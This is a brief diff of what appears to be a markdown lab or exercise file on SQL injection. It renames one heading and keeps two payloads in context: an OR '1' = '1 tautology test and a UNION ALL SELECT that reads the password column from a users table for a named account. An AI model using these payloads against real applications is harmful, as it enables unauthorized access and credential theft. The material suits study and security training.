@@ -81,7 +81,7 @@ Test if sql injection works
 ```
 mstubenberg' OR '1' = '1
 ```
-Replace password for user
+Get password for user
 ```
 fakeuser' UNION ALL SELECT "test" as test,password FROM users WHERE username = 'attorney1
 ```
